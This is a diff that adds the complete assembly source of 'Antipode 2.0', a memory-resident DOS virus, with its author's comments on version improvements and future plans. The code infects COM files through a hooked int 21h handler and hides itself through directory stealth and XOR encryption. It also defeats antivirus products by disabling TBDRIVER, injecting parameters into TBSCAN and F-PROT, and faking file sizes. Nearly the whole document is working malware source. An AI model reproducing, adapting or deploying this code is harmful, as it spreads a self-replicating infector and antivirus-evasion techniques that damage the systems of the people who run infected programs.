@@ -1,0 +1,593 @@
+; Hi guys, here's Automag hitting once again from France...
+; Here comes Antipode Version 2.0, it really looks like 1.0 at the 1st look
+; but i have done a lot of improvements, and fixed a bug ( try to copy COM
+; files under windows file's manager when the 1.0 is in memory... i had
+; never seen Windows going back to Dos so fast :) ) the bug was at the 
+; line 254... and that was stupid ... just a pop...
+
+; the Majors improvements are :
+; - Fake parameters added to TBSCAN command line to avoid memory scan and
+;   'OWN' file system.
+; - Patch the screen to 'OWN' instead of 'DOS'.
+; - Fake parameters added to F-PROT command line to avoid memory scan.
+; - Disable infection while f-prot is running to avoid the nasty
+;   'Alert ! an active "stealth" virus has been found in memory' flag. 
+; - Use the original int 21h vector, thus calls cant get monitored.
+; - Disable TBDRIVER when found in memory, thus avoiding the whole TBAV pack.
+; - still infect on int 21h 3d/6c/4b.
+; - still fake tbscan by saying that the size is 0 if the file is infected.
+; - still 11/12 & 4e/4f stealth.
+; - this version is not detected by TBAV 6.34 ( 1.0 was detected ).
+; - And last but not least: you dont need to trace anymore after compiling
+;   just copy the binary after a 16 bytes .com that just jump at the end...
+; i perhaps added some other stuffs, in fact, i cant remember :)
+
+; Things to do :
+; - disinfection on the fly
+; - EXE infection, yep, i never coded an EXE infector :)
+; - Polymorphic encryption
+; - Command.com infection... all my tests crashed lamely, but i will do my best
+; - reduce the size under the 15Kb :)
+
+exec_adr        =       0000:0100h              ; Address of return
+
+		jumps                           ; Allow Tasm to resolve too
+						; long jumps
+virusseg        segment byte public
+		assume  cs:virusseg, ds:virusseg
+
+		org     0000h                   ; Begin the virus at IP=0
+
+start:
+		push    ds:[101h]               ; 101=offset of the jump
+		pop     dx
+		sub     dx,0FFFFh-102h          ; Dx=offset start
+		push    dx                      ; put it on the stack
+		mov     si,offset quit          ; adaptation of Qarks routine
+						; to fool debuggers
+		add     si,dx
+		mov     word ptr ds:[si],20CDh
+quit:           mov     word ptr ds:[si],04C7h
+
+		call    cryptage                ; decrypt the virus
+		jmp debut_cr                    ; jump to the virus
+
+cryptage        proc near
+		mov     si,offset debut_cr      ; start of the encrypted area
+		add     si,dx                   ; fix it 
+		mov	di,si
+		sub	di,140h
+cryptage_2      proc near                       ; this proc will be called to
+						; encrypt the virus
+		mov     cx,offset last-offset debut_cr
+						; cx=length to encrypt
+cr:             xor     word ptr ds:[si],di     ; enc/decrypt the virus
+		inc     si                      ; move to next byte 
+		loop    cr                      ; and enc/decrypt the virus
+		ret
+cryptage_2      endp
+cryptage        endp
+
+debut_cr:       
+		mov     si,offset buffer        ; Buffer contains original
+						; bytes of the virus
+		add     si,dx                   ; fix it once again
+		mov     di,100h                 ; destination is entrypoint
+		push    cs
+		pop     es
+		movsw
+		movsb                           ; Patch back to the original
+
+		mov     ah,02ch                 ; Ask for the Time
+		int     21h
+		cmp     dl,242                  ; Are we in memory ? 
+		jne     not_in_ram              ; if not, install
+		push    cs
+		mov     ax,100h
+		push    ax
+		retf                            ; go back to original entry
+
+not_in_ram:
+		call	disable_tbdriver
+		push    cs
+		pop     ax
+		dec     ax
+		mov     ds,ax                   ; DS -> MCB
+		inc     ax
+		mov     cx,word ptr ds:[0003]
+		mov     dx,cx                   ; DX=number of parag. left
+		add     dx,ax
+		sub     cx,(((last2-start)/16)+1)*2
+						; alloc 2*size of the virus 
+		mov     word ptr ds:[0003],cx   ; fix the MCB
+		mov     cx,dx
+		sub     cx,(((last2-start)/16)+1)*2
+		mov     es,cx                   ; es=future cs of the virus
+		mov     cx,(last2-start)+1      ; size of the virus
+		push    cs
+		pop     ds
+		pop     dx
+		mov     si,dx                   ; si = entry of the virus
+
+		push    si
+		push    cx
+
+		mov     di,0
+		rep movsb                       ; copy the virus to es:0
+
+		pop     cx
+		pop     si
+
+		rep movsb                       ; once again
+
+		push    es
+		mov     cx,offset nextstep
+		push    cx
+		retf                            ; Jump to ES:IP
+		;install the virus in ram and hook vectors
+nextstep:                                       ; We are at the top of mem
+
+		push    cs
+		pop     ds
+		mov     word ptr ds:[farjmp+3],ax
+						; Fix the return adress
+
+		mov     ax,5200h                ; Get the original vectors
+		int     21h			; of int 21h
+		mov     ds:word ptr save_int21+2,es     
+		mov     ds:word ptr save_int21,109eh
+
+		push	ds
+		cli
+		xor	ax,ax
+		mov	ds,ax
+		mov     ax,offset my_int21      ; Use our int instead
+		xchg	word ptr ds:[21h*4],ax
+		mov	word ptr cs:[old_int21],ax
+		mov     ax,cs
+		xchg	word ptr ds:[21h*4+2],ax
+		mov	word ptr cs:[old_int21+2],ax
+		sti
+		pop	ds
+	
+farjmp:         jmp far ptr exec_adr            ;Return to the original
+
+
+my_int21        proc    far
+		cmp     ah,4ch
+		je      terminate
+		cmp	byte ptr cs:[fprot_active],1
+		je	to_vect
+		cmp     ah,11h          ; Find first
+		je      dir_stealth
+		cmp     ah,12h          ; Find next
+		je      dir_stealth
+		cmp     ah,4Eh          ; Find first
+		je      find_file
+		cmp     ah,4Fh          ; Find next
+		je      find_file
+		cmp     ah,3dh          ; File open
+		je      check_it
+		cmp     ah,4bh          ; Exec
+		je      check_it
+		cmp     ah,6ch          ; Extended open
+		je      check_it
+		cmp     ah,02ch         ; Time
+		jne     to_vect
+
+		call    int21
+
+		mov     dl,242          ; seconds = 242
+		push    cs
+		pop     bx
+		iret
+check_it:
+		jmp     check_it2
+
+dir_stealth:
+		call    int21
+		test    al,al
+		jnz     not_a_file
+
+		pushf
+		push	di
+		push    ax
+		push    bx
+		push    es
+
+		mov     ah,51h
+		call	int21
+
+		mov     es,bx
+		cmp     bx,es:[16h]
+		jnz     not_infected
+		mov     bx,dx
+		mov     al,[bx]
+		push    ax
+		mov     ah,2fh
+		call	int21
+		pop     ax
+		inc     al
+		jnz     fcb_ok
+		add     bx,7h
+fcb_ok:         mov     ax,es:[bx+17h]
+		add     bx,3
+		jmp     patch_size
+find_file:
+		call    int21
+		jc      not_a_file
+		pushf
+		push	di
+		push    ax
+		push    bx
+		push    es
+
+		cmp     byte ptr cs:[tbscan_active],1
+						; is TBSCAN active ?
+		jne     dont_fool_DOS
+
+		mov	cx,1
+		mov	ax,0b800h
+		mov	es,ax
+		mov	di,956h
+		mov	al,'O'
+		stosb
+		inc	di
+		mov	al,'W'
+		stosb
+		inc	di
+		mov	al,'N'
+		stosb
+
+dont_fool_DOS:
+		mov     ah,2Fh
+		call	int21
+
+		mov     ax,es:[bx+16h]          ; ax=time 
+patch_size:
+		and     al,1fh                  ; ax=seconds
+		xor     al,1                    ; are seconds=2 ?
+		jnz     not_infected
+		mov     ax,offset last-offset start
+						; ax = size of the virus
+		cmp     cx,1
+						; is TBSCAN active ?
+		jne     dont_fool
+		mov     ax,word ptr es:[bx+1Ah] ; if active then file size = 0
+
+dont_fool:      sub     word ptr es:[bx+1Ah],ax
+						; sub virus size to file size
+
+not_infected:
+		pop      es
+		pop      bx
+		pop      ax
+		pop	 di
+		popf
+
+not_a_file:
+		retf 2                          ; no iret to save the flags
+						; thanks to Qark...
+
+check_it2:      pushf
+		push    ax
+		push    bx
+		push    cx
+		push    di
+		push    dx
+		push    ds
+		push    es
+		push    si
+		mov     byte ptr cs:[function],ah
+						; save ah for later
+		cmp     ax,6c00h
+		jne     not_extended
+		cmp     dl,1                    ; int 21h ax=6c00h/dx=0001h->
+						; int 21 ah=3dh
+		jne     push_no_good
+		mov     dx,si                   ; the name -> DS:SI
+not_extended:
+		mov	cs:[save_es],es
+		mov	cs:[save_bx],bx
+		push    ds
+		push    dx                      ; save filename seg/offs
+
+		mov     ax,3524h
+		call	int21
+		mov     word ptr cs:[save_int24],bx
+		mov     word ptr cs:[save_int24+2],es
+						; save int 24h
+		push    cs
+		pop     ds
+		mov     dx,offset my_int24
+		mov     ax,2524h
+		call	int21
+
+		pop     dx
+		pop     ds                      ; restore the filename
+
+		mov     al,00h
+		push    ds
+		push    ds
+		pop     es
+		mov     di,dx
+		mov     cx,0ffh
+		repne   scasb                   ; seek to the end of the name
+
+		push    cs
+		pop     ds
+		push	ds es
+		cmp     byte ptr cs:[function],4bh
+		jne     not_exec
+		push    di
+		sub     di,11
+		mov     si,offset tbscan
+		mov     cx,10
+		rep     cmpsb
+
+		jnz     not_tbscan
+		mov     byte ptr cs:[tbscan_active],1
+		mov	bx,offset tbscan_command
+		jmp	pass_parameters
+not_tbscan:
+		pop	di
+		push	di
+		sub     di,9
+		mov     si,offset fprot 
+		mov     cx,8
+		rep     cmpsb
+		jnz     not_fprot
+		mov     byte ptr cs:[fprot_active],1
+		mov	bx,offset fprot_command
+pass_parameters:
+		mov	ax,cs:[save_es]
+		mov	ds,ax
+		mov	si,cs:[save_bx]
+		add	si,2
+		lodsw
+		mov	di,ax
+		lodsw
+		mov	es,ax
+		mov	ds,ax
+		mov	si,di
+		xor	ax,ax
+		lodsb
+		add	ax,8
+		stosb
+		add	di,ax
+		sub	di,8
+		mov	ax,cs
+		mov	ds,ax
+		mov	si,bx
+		mov	cx,9
+		rep	movsb
+not_fprot:
+		pop	di
+		
+not_exec:
+		pop	es ds
+		sub     di,4
+		push    di                      ; seek to the extension
+
+		mov     si,offset comfile
+		mov     cx,3
+
+		rep     cmpsb                   ; check if the file is a COM
+		pop     di
+		jz      good
+
+
+		push    di
+		mov     si,offset comfile+3
+		mov     cx,3
+
+		rep     cmpsb                   ; or a com
+		pop     di
+		jnz     no_good
+
+good:
+		pop     ds
+		cmp     word ptr [di-3],'DN'    ; COMMAND.COM ?
+		jz      push_no_good
+
+		mov     ax,4300h
+		call	int21                   ; get the attributes
+
+		mov     word ptr cs:[save_attrib],cx
+		jc      exit_2                  ; if no file exists...RUN !!!
+
+		and	cl,00100000b
+		jne	exit_2
+
+		mov     ax,4301h
+		xor     cx,cx
+		call    int21                   ; set zero attributes
+
+		push    ds
+		push    dx
+
+		mov     ax,3d02h                ;Open file Read/write
+
+		call    int21
+
+		mov     bx,ax                   ; bx = handle
+		mov     ax,5700h                ; get file time/date
+		call    int21
+		mov     cs:[save_time],cx
+		mov     cs:[save_date],dx       ; save them
+
+		mov     ax,word ptr cs:[save_time]
+						;Check for an infection
+		and     al,1Fh
+		xor     al,1    
+		je      dirty_exit
+
+		push    cs
+		pop     ds
+		mov     dx,offset buffer+(offset last2-offset start)+1
+		mov     cx,end_patch-patch
+		mov     ax,3F00h                ; Read xx first bytes
+		call    int21                   ; to te buffer of the second
+						; copy of the virus in memory
+
+		xor     cx,cx
+		xor     dx,dx
+		mov     ax,4202h                ; Seek to EOF..
+		call	int21
+
+		mov     di,ax                   ; ax = end of file
+		add     di,offset debut_cr-offset start+100h-140h
+						; di = value of the XOR
+		sub     ax,3h                   ; ax = adress of the jump
+		mov     word ptr cs:[return+1],ax
+						; patch the future file
+		mov     si,(offset last2-offset start)+offset debut_cr+1
+						; si=offset of the 2nd virus
+		push    si
+		push    di
+
+		call    cryptage_2              ; crypt the 2nd copy
+
+		push    cs
+		pop     ds
+		mov     dx,offset last2+1       ; dx= offset of the 2nd copy
+		mov     cx,last-start
+		mov     ah,40h
+		call    int21                   ; Write the virus to file...
+
+		pop     di
+		pop     si
+
+		call    cryptage_2              ; decrypt the 2nd copy
+
+		xor     cx,cx
+		xor     dx,dx
+		mov     ax,4200h                ; seek to start of file
+		call    int21
+
+		push    cs
+		pop     ds
+		mov     dx,offset patch
+		mov     cx,end_patch-patch
+		mov     ah,40h
+		call	int21                   ; write the jump to the file
+
+		mov     dx,cs:[save_date]
+		mov     cx,cs:[save_time]
+		or      cx,0001h
+		and     cx,0FFE1h
+		mov     ax,5701h
+		call	int21                   ; restore file time/date
+
+dirty_exit:
+		pop     dx
+		pop     ds
+
+		mov     ah,3eh
+		call	int21                   ; close the file
+
+
+exit_2:         mov     ax,4301h
+		mov     cx,word ptr cs:[save_attrib]
+		call	int21                   ; restore the attributes
+push_no_good:
+		push    ds
+no_good:
+		pop     ds
+		mov     ds,cs:[save_int24+2]
+		mov     dx,cs:[save_int24]
+		mov     ax,2524h
+		call	int21                  ; restore the int 24h
+
+		pop     si
+		pop     es
+		pop     ds
+		pop     dx
+		pop     di
+		pop     cx
+		pop     bx
+		pop     ax
+		popf
+to_vect:        jmp     dword ptr cs:[old_int21]
+						; and call the int 21h
+terminate:
+		mov     byte ptr cs:[tbscan_active],0
+		mov     byte ptr cs:[fprot_active],0
+		jmp     to_vect
+
+my_int21        endp
+
+my_int24        proc    far                     ; int 24h
+		mov     al,0                    ; no problem...
+		iret                            ; and return
+my_int24        endp
+
+disable_tbdriver:
+		mov	ax,5200h
+		int	21h
+		mov	ax,es:[bx-2]
+		mov	bx,cs
+		mov	es,bx
+next_mcb:
+		mov	ds,ax
+		cmp	byte ptr ds:[0000],'Z'
+		jz	last_MCB
+		mov	si,8
+		mov	di,offset TBDRIVER
+		mov	cx,5
+		rep	cmpsb	
+		jz	TBfound
+		add	ax,word ptr ds:[0003]
+		inc	ax
+		jmp	next_mcb
+TBfound:
+		mov	bx,0CF0h
+		mov	si,0
+search_next:
+		mov	di,offset TBDRIVER_Entry
+		mov	cx,3
+		rep	cmpsb
+		jz	seek_to_patch
+		dec	bx
+		jnz	search_next	
+seek_to_patch:
+		mov	byte ptr [si-2],0
+last_mcb:
+		ret
+TBDRIVER 	db 'TBDRIVER'
+TBDRIVER_ENTRY	db 0ebh,05h,0eah
+endp
+
+comfile         db 'COMcom'                     ; extensions to infect
+tbscan          db 'TBSCAN.EXE'
+fprot		db 'PROT.EXE'
+		db '[Antipode 2.0]'
+tbscan_command	db ' co nm ',0dh
+fprot_command	db ' /nomem',0dh
+tbscan_active   db      0
+fprot_active	db      0
+buffer:         db      0CDh,20h,90h    
+int21   proc    near
+		pushf
+		db 9Ah
+save_int21      dw      2 dup (?)
+		ret
+int21   endp
+
+patch:
+return:         db      0e9h
+last:           db      00,00
+end_patch:
+
+save_es		dw	0
+save_bx		dw	0
+save_int24      dw      2 dup (?)
+old_int21	dd	0
+function        db      0
+save_attrib     dw      0
+save_date       dw      0
+save_time       dw      0
+
+last2:
+virusseg        ends
+		end     start
